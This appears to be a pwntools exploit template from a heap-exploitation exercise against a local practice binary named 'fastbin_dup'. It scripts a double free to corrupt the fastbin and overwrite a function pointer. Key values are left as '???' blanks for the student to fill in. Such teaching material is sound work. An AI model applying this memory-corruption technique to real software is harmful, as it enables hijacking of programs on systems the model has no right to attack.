#!/usr/bin/env python3
from pwn import *
from struct import pack, unpack
exe = context.binary = ELF('./fastbin_dup')

def menu(r, choice):
    r.recvuntil(b'> ')
    r.sendline(str(choice).encode())

def leak(r):
    menu(r, 0)
    r.recvuntil(b'something.\n')
    leak = []
    r.recvuntil(b'do_nothing: ')
    leak.append(int(r.recvline().decode(), base=16))
    r.recvuntil(b'do_something: ')
    leak.append(int(r.recvline().decode(), base=16))
    return leak

def malloc(r, index):
    menu(r, 1)
    r.recvuntil(b'allocate?\n> ')
    r.sendline(str(index).encode())

    resp = r.recvline()
    if b'address' not in resp:
        log.warn(f'malloc(r, {index}) failed. Invalid index value.')
        return

    chunk = resp.split(b':')[1].strip()
    chunk = int(chunk, base=16)
    return chunk
    
def write_chunk(r, index, data):
    menu(r, 2)
    r.recvuntil(b'write to?\n> ')
    r.sendline(str(index).encode())

    resp = r.recvline()
    if b'Now enter' not in resp:
        log.warn(f'write_chunk(r, {index}, {data}) failed. Invalid index value.')
        return

    r.recvuntil(b'> ')
    r.sendline(data)

def do_nothing(r):
    menu(r, 3)
    resp = r.recvline()
    print(f'Do nothing output: \"{resp}\"')

def free_chunk(r, index):
    menu(r, 4)
    r.recvuntil(b'free?\n> ')
    r.sendline(str(index).encode())

    resp = r.recvline()
    if b'can\'t' in resp or b'sscanf' in resp:
        log.warn(f'free_chunk(r, {index}) failed.')
        return

    
def quit(r):
    menu(r, 5)

io = exe.process()

# allocate two chunks
malloc(io, 0)
malloc(io, 1)

# use our double free to get two pointers to the
# same chunk into the fastbin
free_order = [???, ???, ???]
for idx in free_order:
    free_chunk(io, idx)

# now our fastbin looks like A --> B --> A --> [null]
# if we overwrite the value in A, B will be corrupted
# to whatever value we want, giving us an arbitrary write

    
# Now we have to allocate a chunk to a valid location
# according to malloc. A valid chunk looks like this
#
# chunk addr->  ********************************
#               * prev_size       | size & flags*
# mem addr->    ********************************
#               *   user controlled space      *
#               ********************************
# next chunk->  * next chunk size              *
#
# In the size & flags field, our size value has to
# be of fastbin size, it doesn't really matter what the flags
# are though.

valid_delta = ???
valid_address = exe.symbols['func'] - valid_delta
write_chunk(io, 0, p64(valid_address))

# allocate a chunk to pop the topmost chunk off the fastbin
malloc(io, 2)

# now we allocate our malicious chunk to our desired location
malloc(io, 1)

# writing to our chunk won't be exactly where we want it,
# so we'll have to add some padding
padding = ???
write_chunk(io, 1, b'\x00'*padding + p64(exe.symbols['do_something']))

# now if re run do_nothing we should get a different output
io.interactive()
